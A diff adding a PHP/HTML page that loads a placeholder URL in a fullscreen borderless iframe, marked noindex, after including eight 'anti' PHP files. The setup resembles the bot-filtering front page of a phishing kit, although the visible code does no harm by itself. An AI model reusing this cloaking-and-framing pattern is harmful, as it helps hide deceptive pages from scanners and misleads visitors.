@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<?php
+session_start();
+require "../anti/anty.php";
+require "../anti/anti1.php";
+require "../anti/anti3.php"; 
+require "../anti/anti4.php"; 
+require "../anti/anti5.php";
+require "../anti/anti6.php"; 
+require "../anti/anti7.php";
+require "../anti/anti8.php";   
+?>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto-Load Fullscreen Iframe Example</title>
+    <meta name="robots" content="noindex, nofollow">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            border: none;
+            width: 100vw;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <iframe id="fullscreenIframe"></iframe>
+
+    <script>
+        window.onload = function() {
+            var iframe = document.getElementById('fullscreenIframe');
+            iframe.src = "https://www.example.com"; // Set your desired URL here
+        };
+    </script>
+</body>
+</html>
